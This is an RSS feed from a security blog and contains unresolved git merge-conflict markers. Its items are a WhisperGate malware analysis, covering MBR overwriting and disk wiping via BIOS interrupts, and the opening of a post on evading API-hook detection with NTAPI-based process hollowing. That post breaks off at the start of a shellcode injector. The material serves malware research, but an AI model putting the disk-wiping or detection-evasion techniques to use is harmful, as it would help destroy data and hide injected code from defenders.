<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>windoz on rxOred&#39;s blog</title>
    <link>https://rxOred.github.io/tags/windoz/</link>
    <description>Recent content in windoz on rxOred&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 19 Jan 2022 09:40:08 +0000</lastBuildDate><atom:link href="https://rxOred.github.io/tags/windoz/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>WhisperGate</title>
      <link>https://rxOred.github.io/post/analysis/whispergate/whispergate/</link>
      <pubDate>Wed, 19 Jan 2022 09:40:08 +0000</pubDate>
      
      <guid>https://rxOred.github.io/post/analysis/whispergate/whispergate/</guid>
<<<<<<< HEAD
      <description>Table of content  Introduction  Samples   Environment  Tools   Analysis  Behavioral analysis Static analysis  The pe Reversing the pe   Extracting boot sector code Reversing boot sector code   The end  Introduction Dozens of Ukranian government sites, including Ministry of foreign affairs, Cabinet of ministers and security council have been hit by a massive cyber attack.
Microsoft incident response team recently released samples of destructive malware used in the campaign.</description>
=======
      <description>Table of content Introduction Samples Environment Tools Analysis Behavioral analysis Static analysis The PE Code analysis Extracting boot sector code Reversing boot sector code The end Introduction On 05.01.2022, Ukrain had to face a massive cyber attack. This attack was able to take down IT infrastructure of several organizations completely.
Microsoft incident response team recently released samples of malware used in the campaign.
Samples virustotal filescan.io
Environment Windows 10 guest (Virtualbox) Windows 10 host Tools IDA x32dbg bochs Analysis Behavioral analysis malware needs administrative privileges in order to be successful.</description>
      <content>&lt;h1 id=&#34;table-of-content&#34;&gt;Table of content&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;#introduction&#34;&gt;Introduction&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;#samples&#34;&gt;Samples&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#environment&#34;&gt;Environment&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;#tools&#34;&gt;Tools&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#analysis&#34;&gt;Analysis&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;#Behavioral-analysis&#34;&gt;Behavioral analysis&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#static-analysis&#34;&gt;Static analysis&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;#the-pe&#34;&gt;The PE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#code-analysis&#34;&gt;Code analysis&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#extracting-boot-sector-code&#34;&gt;Extracting boot sector code&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#reversing-boot-sector-code&#34;&gt;Reversing boot sector code&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#the-end&#34;&gt;The end&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;On 05.01.2022, Ukrain had to face a massive cyber attack. This attack was able to take down IT infrastructure of several organizations completely.&lt;/p&gt;
&lt;p&gt;Microsoft incident response team recently released samples of malware used in the campaign.&lt;/p&gt;
&lt;h2 id=&#34;samples&#34;&gt;Samples&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.virustotal.com/gui/file/a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92&#34;&gt;virustotal&lt;/a&gt;
&lt;a href=&#34;https://www.filescan.io/uploads/61e5524c0f8c757253c42839&#34;&gt;filescan.io&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;environment&#34;&gt;Environment&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;    Windows 10 guest (Virtualbox)
    Windows 10 host
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;    IDA
    x32dbg
    bochs
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;analysis&#34;&gt;Analysis&lt;/h1&gt;
&lt;h2 id=&#34;behavioral-analysis&#34;&gt;Behavioral analysis&lt;/h2&gt;
&lt;p&gt;malware needs administrative privileges in order to be successful.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/admin_exec.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Malware does not create any network traffic, registry modifications or file modifications&lt;/p&gt;
&lt;p&gt;Upon restarting, device will boot into a screen displaying the following ransom note.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/ransomnote.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;static-analysis&#34;&gt;Static analysis&lt;/h2&gt;
&lt;h3 id=&#34;the-pe&#34;&gt;The PE&lt;/h3&gt;
&lt;p&gt;According to detect it easy, the file is a 32 bit PE file.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/die.png&#34; alt=&#34;die result&#34;&gt;
it is compiled and linked using MinGW (GCC 6.3.0) and GNU linker.&lt;/p&gt;
&lt;p&gt;die shows entropy as 6.07208, which is high but it also says executable is not packed.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/entropy.png&#34; alt=&#34;entropy&#34;&gt;
As usual, entropy in the .text section is higher than in the other sections.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/strings.png&#34; alt=&#34;strings&#34;&gt;
strings in the binary are not encrypted. several strings shown in the above diagram gives hints about
malware&amp;rsquo;s capabilities such as disk corruption.&lt;/p&gt;
&lt;p&gt;Also, note that it shows a bitcoin wallet and a tox ID that can be used as signatures.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- 1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv
- 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Executable does not have many imports. There&amp;rsquo;s no APIs related to cryptography eventhough malware claims to encrypt the files.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/imports.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;code-analysis&#34;&gt;Code analysis&lt;/h3&gt;
&lt;p&gt;IDA shows that PE contains two TLS callbacks. Initially suspected these were for anti-debugging purposes but turns out to be no.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/tlscallback1.png&#34; alt=&#34;&#34;&gt;
first TLS callback starts calling some function pointers if &lt;code&gt;Reason&lt;/code&gt; is &lt;code&gt;DLL_THREAD_ATTACH&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/tlscallback2.png&#34; alt=&#34;&#34;&gt;
the second TLS callback simply returns if &lt;code&gt;Reason&lt;/code&gt; is something other than &lt;code&gt;DLL_THREAD_DETACH&lt;/code&gt; or &lt;code&gt;DLL_PROCESS_DETACH&lt;/code&gt;,
suggesting this may be de initializing whatever initialized by the &lt;code&gt;tlscallback1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/startfunc.png&#34; alt=&#34;&#34;&gt;
start function calls &lt;code&gt;sub_4011b0&lt;/code&gt; after setting the app type.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/calls_403b60.png&#34; alt=&#34;&#34;&gt;
&lt;code&gt;sub_4011b0&lt;/code&gt; calls function &lt;code&gt;sub_403b60&lt;/code&gt; that is responsible for main functionality of the malware.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/overwritembr.png&#34; alt=&#34;&#34;&gt;
the function copies 2048 bytes at global offset `` into the stack.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/bootsectorcode.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/bootsignature.png&#34; alt=&#34;&#34;&gt;
offset contains bytes of compiled x86 real mode boot sector code, along with the boot signature &lt;code&gt;0x55AA&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Then it calls &lt;code&gt;CreateFileW&lt;/code&gt; passing &lt;code&gt;\\\\.\\PhysicalDrive0&lt;/code&gt; as filename argument. returned handle is then passed to &lt;code&gt;WriteFile&lt;/code&gt; along with the stack buffer that contains boot sector code. If the call is successful, it will overwrite MBR (master boot record) with a custom boot sector.&lt;/p&gt;
&lt;p&gt;After BIOS has done selecting the boot device it will load overwritten MBR into memory and the CPU will start executing a parasite bootloader.&lt;/p&gt;
&lt;p&gt;Also, note that malware does not encrypt anything.&lt;/p&gt;
&lt;h2 id=&#34;extracting-boot-sector-code&#34;&gt;Extracting boot sector code&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/extracting_boot_sector_code.png&#34; alt=&#34;&#34;&gt;
buffer containing boot sector code can be extracted by placing a breakpoint at the address where it is accessed and using the show in dump feature in x32dbg.&lt;/p&gt;
&lt;p&gt;extracted buffer can be then saved as a raw binary file for further analysis.&lt;/p&gt;
&lt;h2 id=&#34;reversing-boot-sector-code&#34;&gt;Reversing boot sector code&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/printing_fake_ransom_note.png&#34; alt=&#34;&#34;&gt;
cs segment register is initially initialized to 0x0, it is used to zero out &lt;code&gt;ax&lt;/code&gt; and set up other segment registers. then loads the ransom note into &lt;code&gt;si&lt;/code&gt; register.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/fake_ransom_note.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Next instruction calls &lt;code&gt;print_loop&lt;/code&gt;, which then calls &lt;code&gt;print_char&lt;/code&gt; after loading &lt;code&gt;al&lt;/code&gt; with the byte at &lt;code&gt;si&lt;/code&gt;. And it will repeat this operation until &lt;code&gt;[si]&lt;/code&gt; is null.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/print_char.png&#34; alt=&#34;&#34;&gt;
&lt;code&gt;print_char&lt;/code&gt; uses BIOS interrupts to put a single character into the screen. A BIOS interrupt call is a feature of BIOS that allows bootloaders and early kernels to access BIOS services such as video memory access and low-level disk access. To use BIOS interrupts, &lt;code&gt;ah&lt;/code&gt; register should be initialized to the function number. parameters passed down through registers and similar to x86 syscalls, &lt;code&gt;int&lt;/code&gt; instruction is used to do the software interrupt along with the BIOS service number&lt;/p&gt;
&lt;p&gt;For instance, in the above image, malware loads Display character function number &lt;code&gt;0x0e&lt;/code&gt; into &lt;code&gt;ah&lt;/code&gt; and calls
BIOS video service.&lt;/p&gt;
&lt;p&gt;More about BIOS interrupts - &lt;a href=&#34;http://www.cs.cmu.edu/~ralf/files.html&#34;&gt;Ralf Brown&amp;rsquo;s BIOS interrupt list&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;After printing the ransom note, the overwritten code jumps into another label&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/jump.png&#34; alt=&#34;&#34;&gt;
which then jumps to label &lt;code&gt;corrupt_c&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/corrupt_c.png&#34; alt=&#34;&#34;&gt;
Two insutrctions after segment register initialization sets word at &lt;code&gt;0x7c78&lt;/code&gt; to 0x0000 and dword at &lt;code&gt;0x7c76&lt;/code&gt; to &lt;code&gt;0x7c82&lt;/code&gt; (&amp;lsquo;AAAA&amp;rsquo;).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/bochs_byte_array_mem.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;This basically initializes the DAP (Disk Address Packet) structure. DAP is a structure that should be initialized in memory in order to use Logical block addressing with interrupt 0x13. This structure is then should be passed through &lt;code&gt;si&lt;/code&gt; register.&lt;/p&gt;
&lt;p&gt;layout of the structure&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;Offset&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;Size&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;Description&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;size&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;packet&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bytes&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1&lt;/span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;always&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;2&lt;/span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;2&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;number&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sectors&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;transfer&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;max&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;some&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;BIOSes&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;4&lt;/span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;4&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;transfer&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;buffer&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bit&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;segment&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bit&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;offset&lt;/span&gt;) (&lt;span style=&#34;color:#66d9ef&#34;&gt;see&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;note&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#1)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;8&lt;/span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;4&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;lower&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;-&lt;span style=&#34;color:#66d9ef&#34;&gt;bits&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;-&lt;span style=&#34;color:#66d9ef&#34;&gt;bit&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;starting&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;LBA&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;12&lt;/span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;4&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;upper&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;-&lt;span style=&#34;color:#66d9ef&#34;&gt;bits&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;-&lt;span style=&#34;color:#66d9ef&#34;&gt;bit&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;starting&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;LBA&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;before the interrupt call &lt;code&gt;int 0x13&lt;/code&gt;, which is used for low-level disk access, &lt;code&gt;ah&lt;/code&gt; register is initialized to 0x43, BIOS function number for writing sectors to the disk.&lt;/p&gt;
&lt;p&gt;following registers are also initialized&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;al&lt;/span&gt;      - &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;close&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;clock&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;write&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;dl&lt;/span&gt;      - &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;hard&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;disk&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;si&lt;/span&gt;      - &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7c72&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;DAP&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;si&lt;/code&gt; register is loaded with address &lt;code&gt;0x7c72&lt;/code&gt;, which must be the disk address packet.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/DAP.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The next few instructions check whether an extended write operation is successful or not. if &lt;code&gt;cf&lt;/code&gt; is set (errors) control flow gets redirected to &lt;code&gt;loc_7c45&lt;/code&gt;, else, to &lt;code&gt;loc_7c5d&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/failed.png&#34; alt=&#34;&#34;&gt;
at &lt;code&gt;loc_7c45&lt;/code&gt;, it increments the last element in the byte array by 1 and moves 0x1 to &lt;code&gt;[0x7c7a]&lt;/code&gt;. int next instruction zero out &lt;code&gt;[0x7c7e]&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/whispergate/success.png&#34; alt=&#34;&#34;&gt;
&lt;code&gt;loc_7c5d&lt;/code&gt; adds 0xc7 to &lt;code&gt;[0x7c7a]&lt;/code&gt; and 0x0 &lt;code&gt;[0x7c7e]&lt;/code&gt;. &lt;code&gt;clc&lt;/code&gt; clears the carry flag.&lt;/p&gt;
&lt;p&gt;Both blocks jumps back to &lt;code&gt;corrupt_c&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The loop will continue until the hard disk is completely overwritten by &lt;code&gt;AAAA&lt;/code&gt;s.&lt;/p&gt;
&lt;h1 id=&#34;the-end&#34;&gt;The end&lt;/h1&gt;
&lt;p&gt;quick analysis report of WhisperGate stage 01 ends here.&lt;/p&gt;
&lt;p&gt;#Spread Anarchy!&lt;/p&gt;
</content>
>>>>>>> tmp
    </item>
    
    <item>
      <title>Process Hollowing? not really</title>
      <link>https://rxOred.github.io/post/malware/process-hollowing/process-hollowing/</link>
      <pubDate>Sat, 01 Jan 2022 10:21:31 +0000</pubDate>
      
      <guid>https://rxOred.github.io/post/malware/process-hollowing/process-hollowing/</guid>
      <description>(@bound by jademerien)
Table of Content Introduction The problem The solution Basics Implementation Achieving more stealth References The end Introduction Process hollowing is a code injection / evasion technique that is often used in malware.
Process hollowing technique works by hollowing out a legitimate process image and replacing it with malicous code.
A malware that uses process hollowing starts a target ** process with CREATE_SUSPENDED flag enabled. Then using the handler it got from created the process, it hollows out the legitimate executable image from the target process&amp;rsquo;s memory.</description>
      <content>&lt;p&gt;&lt;a href=&#34;https://www.deviantart.com/jademerien/art/Bound-855334634?comment=1%3A855334634%3A4959164323&#34;&gt;(@bound by jademerien)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;table-of-content&#34;&gt;Table of Content&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;#introduction&#34;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#the-problem&#34;&gt;The problem&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#the-solution&#34;&gt;The solution&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;#basics&#34;&gt;Basics&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#implementation&#34;&gt;Implementation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#achieving-more-stealth&#34;&gt;Achieving more stealth&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#references&#34;&gt;References&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#the-end&#34;&gt;The end&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Process hollowing is a code injection / evasion technique that is often
used in malware.&lt;/p&gt;
&lt;p&gt;Process hollowing technique works by hollowing out a legitimate process
image and replacing it with malicous code.&lt;/p&gt;
&lt;p&gt;A malware that uses process hollowing starts a target **
process with &lt;strong&gt;CREATE_SUSPENDED&lt;/strong&gt; flag enabled. Then using the handler it
got from created the process, it &lt;strong&gt;hollows out&lt;/strong&gt; the legitimate executable
image from the target process&amp;rsquo;s memory.&lt;/p&gt;
&lt;h1 id=&#34;the-problem&#34;&gt;The problem&lt;/h1&gt;
&lt;p&gt;However, malware tends to use the same set of APIs for this task.
Some of these APIs are,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- CreateProcessA
- WriteProcessMemory
- VirtualProtect
- VirtualAlloc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And it is very well known that these APIs are often monitored by defense
solutions.&lt;/p&gt;
&lt;p&gt;The other major disadvantage is that, when using above APIs for code injection,
malware leaves a lot of memory artifacts which makes it easy for forensic analysts
to indetify the parasite.&lt;/p&gt;
&lt;p&gt;For example, in order to do a code injection in windows environment, first one
must allocate enough memory in the target process for the parasite. This alone is
not enough because those alocated memory regions should have &lt;code&gt;executable&lt;/code&gt;  (X)
permission. Those regions should also be &lt;code&gt;writable&lt;/code&gt; because, otherwise,
&lt;code&gt;WriteProcessMemory&lt;/code&gt; or any other API that writes to another process&amp;rsquo;s memory
won&amp;rsquo;t simply work.&lt;/p&gt;
&lt;p&gt;Therefore, Having both &lt;code&gt;executable&lt;/code&gt; and &lt;code&gt;writable&lt;/code&gt; permissions for a memory region
is a strong indication of an infection.&lt;/p&gt;
&lt;h1 id=&#34;the-solution&#34;&gt;The solution&lt;/h1&gt;
&lt;p&gt;Well, there are solutions for the 1st problem. For example, one can directly invoke
syscalls without going through &lt;strong&gt;kernel32.dll&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Of course that&amp;rsquo;s good solution but it wont solve the second issue.&lt;/p&gt;
&lt;h2 id=&#34;basics&#34;&gt;Basics&lt;/h2&gt;
&lt;p&gt;Userland defense solutions mostly operate by hooking common API calls and monitoring
them for malicious content. These common APIs include the ones that malware
often uses for various injection techniques. to name a few,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- OpenProcess / CreateProcess 
- VirtualAlloc
- VirtualProtect
- WriteProcessMemory
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In past, malware authors extensively used &lt;code&gt;VirtualAlloc&lt;/code&gt; to inject malicous
code in to a target process. They acheived this buy allocating a memory chunk
of &lt;strong&gt;RWX&lt;/strong&gt; permissions, which in fact, became a well know indication of code
injection (Memory artifact).&lt;/p&gt;
&lt;p&gt;As a solution to this, malware authors used a combination of VirtualAlloc and
VirtualProtect to inject code into a remote process. First, malware allocates
a memory chunk in the remote process with &lt;strong&gt;RW&lt;/strong&gt; permissions using
VirtualAlloc, then it change the permission to &lt;strong&gt;RX&lt;/strong&gt; using VirtualProtect.&lt;/p&gt;
&lt;p&gt;Although this seem like a victory (since it gets rid off &lt;strong&gt;RWX&lt;/strong&gt; sections),
defense solutions began hooking these two calls.&lt;/p&gt;
&lt;p&gt;Then malware authors came up with another technique, which uses two APIs
from NTAPI. (well, then defense solutions hooked ntdll but as I previously
mentioned, that&amp;rsquo;s out of scope of this blog post)&lt;/p&gt;
&lt;p&gt;In order to understand the technique, one must understand how following
functions from NTAPIs work.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- NtCreateSection
- NtMapViewOfSection
- ZwUnmapViewOfSection
- NtSetContextThread
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;For that purpose, we are going to write a small shellcode injector using some
of above functions.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;winternl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
